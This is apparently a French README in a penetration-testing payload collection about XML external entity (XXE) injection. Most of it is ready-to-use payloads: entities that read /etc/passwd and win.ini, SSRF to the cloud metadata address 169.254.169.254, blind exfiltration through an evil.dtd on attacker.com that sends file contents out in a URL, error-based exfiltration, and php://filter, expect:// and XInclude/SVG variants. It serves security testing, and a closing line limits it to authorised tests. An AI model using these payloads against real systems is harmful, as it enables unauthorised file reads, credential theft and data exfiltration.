# 📄 XXE — injection d’entités XML externes

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   XML External Entity Injection
```

---

> **Prérequis et versions :** ces extraits supposent des fonctionnalités et autorisations propres à l’analyseur : DTD externes, accès aux ressources ou traitement XInclude. Les wrappers PHP ne sont pas des protocoles XML universels ; `expect://` exige notamment une extension qui n’est [pas activée par défaut](https://www.php.net/manual/en/wrappers.expect.php). Les exemples restent ceux de la source, sans garantie universelle de lecture ou d’exécution.
>
> **Encodage :** déclarer UTF-16 ne convertit pas les octets envoyés. La déclaration XML, lorsqu’elle est présente, doit se trouver au début du document ; le commentaire placé avant elle dans l’extrait source ne convient donc pas tel quel à un document XML complet. Voir les règles de [déclaration XML](https://www.w3.org/TR/xml/#sec-prolog-dtd) et d’[encodage des entités](https://www.w3.org/TR/xml/#charencoding). Les fragments et valeurs d’origine sont conservés.

## 🎯 Qu’est-ce qu’une XXE

Une **XXE** exploite un analyseur XML qui traite des références à des entités externes. Elle peut permettre la lecture de fichiers, des requêtes côté serveur (SSRF) et, dans certains environnements, l’exécution de code à distance (RCE).

---

## 💉 Charges utiles élémentaires

### Lire des fichiers locaux
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Fichiers Windows
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF via une XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 XXE aveugles et interactions hors bande (Blind XXE)

### DTD externe (définition de type de document)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd sur le serveur de test :**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Exfiltration fondée sur les erreurs
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡️ Techniques de contournement

### Encodage
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Encapsulation en Base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Variantes de protocoles
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE dans un SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Référence rapide

| Type de charge utile | Utilisation |
|--------------|----------|
| Lecture de fichier | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Aveugle (OOB) | DTD externe et exfiltration |
| Fondée sur les erreurs | Provoquer une erreur contenant les données |

### Points de terminaison couramment concernés
```
- API SOAP
- Téléversements de fichiers XML
- Outils de traitement des SVG
- Analyseurs de documents (DOCX, XLSX)
- Flux RSS/Atom
```

---

## 📚 Ressources

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 Testez la sécurité des analyseurs XML !</b><br>
  <i>Uniquement dans le cadre de tests autorisés !</i>
</p>
